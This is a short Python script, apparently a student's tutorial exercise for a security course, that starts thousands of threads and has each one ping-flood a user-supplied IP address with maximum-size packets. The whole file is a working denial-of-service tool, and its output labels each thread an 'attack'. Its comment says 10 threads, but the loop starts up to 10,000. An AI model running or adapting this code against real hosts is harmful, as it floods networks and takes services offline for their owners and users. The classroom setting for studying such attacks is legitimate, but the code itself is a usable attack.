#Author		: Lim Chee Yeong
#Class		: CSCI262
#Student ID	: J14016414(INTI) or 4933643(UOW)
#Tutorial	: 3
#This program is used to create 10 thread and ping an ip address

import os
import thread
import time
import sys

def flood(src, ip):
	print src + ", attack"
	ping = 'ping -f -i 0.3 -s 65500 -t 255 ' + ip
	os.system(ping)
	print src + ", not working"

def main():
	if len(sys.argv) >= 2:
		ip = sys.argv[1]
	else:
		ip = raw_input("Please enter target ip address: ")
	for x in range(10000):
		src = "Attack " + str(x+1)
		thread.start_new_thread(flood, (src, ip))
		time.sleep(0.1)

if __name__ == '__main__':
	main()
